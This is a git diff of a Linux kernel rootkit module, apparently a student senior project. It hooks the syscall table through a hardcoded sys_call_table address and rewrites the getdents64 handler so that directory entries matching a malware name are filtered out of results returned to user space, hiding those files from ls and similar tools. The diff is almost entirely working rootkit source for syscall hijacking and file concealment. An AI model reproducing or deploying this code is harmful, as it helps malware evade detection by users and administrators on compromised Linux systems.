@@ -15,6 +15,14 @@ MODULE_AUTHOR("Noop Noop");
 MODULE_DESCRIPTION("Senior Project");
 MODULE_VERSION("0.1");
 
+// https://linux.die.net/man/2/getdents64
+struct linux_dirent {
+	long		d_ino;
+	off_t		d_off;
+	unsigned short	d_reclen;
+	char 		d_name[];
+};
+
 
 uint64_t __force_order; //from linux source write_cr0, forces serialization 
 void ** syscall_table;
@@ -22,7 +30,6 @@ char * malware_name = MALWARE_NAME;
 
 // previously saved function pointers
 asmlinkage long (*original_sys_openat)(const struct pt_regs * regs);
-//asmlinkage long (*original_sys_open)(const char __user * filename, int flags, umode_t mode);
 asmlinkage long (*original_sys_open)(const struct pt_regs * regs);
 asmlinkage long (*original_sys_getdents64)(const struct pt_regs * regs);
 
@@ -61,12 +68,50 @@ asmlinkage long mal_sys_open(const struct pt_regs * regs)
 asmlinkage long mal_sys_getdents64(const struct pt_regs * regs)
 {
 	// check if file is included in getdents64 (ls source, readdir source)
+	// first save the linux_dirent pointer
+	void * dirent_ptr = regs->si;
+	printk(KERN_INFO "COUNT: %x\n", regs->dx);
+
 	long size = original_sys_getdents64(regs);
+	printk(KERN_INFO "RET: %lx\n", size);
+
 	if (size > 0){
-		if (strstr(regs->si+0x20, malware_name)) {
-			// each call seeks file stream, so just return next
-			return original_sys_getdents64(regs);
+		char * buffer = kmalloc(size+1, GFP_KERNEL);
+		int copied_bytes = copy_from_user(buffer, dirent_ptr, size);
+		if (copied_bytes > 0) {
+			printk("UNKNOWN ERROR");
+			return size;
 		}
+
+		// create a new buffer to copy into, in case there are bad files
+		char * clean_buff = kmalloc(size+1, GFP_KERNEL);
+
+		int curr_off = 0;
+		int clean_off = 0;
+		for (curr_off = 0; curr_off < size; ) {
+			struct linux_dirent * dpt = (struct linux_dirent *)(buffer+curr_off);
+			printk(KERN_INFO "SIZE: %lx\n", dpt->d_reclen);
+			printk(KERN_INFO "NAME: %s\n", dpt->d_name);
+
+			// it can be seen in the debug information that d_name starts with a character
+			// 0x04 indicates a directory
+			// 0x08 indicates a file
+			// This should not matter as we are trying to block a file, and 0x04 is not NULL 
+
+			if (strstr(dpt->d_name, malware_name)) {
+				// each call seeks file stream, so just return next
+				curr_off += dpt->d_reclen;
+				continue;
+			}
+
+			memcpy(clean_buff+clean_off, buffer+curr_off, dpt->d_reclen);
+
+			clean_off += dpt->d_reclen;
+			curr_off += dpt->d_reclen;
+		}
+
+		copy_to_user(dirent_ptr, clean_buff, clean_off);
+		return clean_off;
 	}
 	return size; 
 }
@@ -130,7 +175,7 @@ static int __init rootkit_init(void)
 		//syscall_table = (uint64_t *)kallsyms_lookup_name("sys_call_table");
 		//syscall_table = syscall_table_lookup();
 		// manually patch for now
-		syscall_table = (void *)0xffffffffb1a002c0;
+		syscall_table = (void *)0xffffffff996002c0;
 		printk(KERN_INFO "SYSCALL TABLE @ %llx\n", (uint64_t)syscall_table);
 
 		original_sys_open = syscall_table[__NR_open];
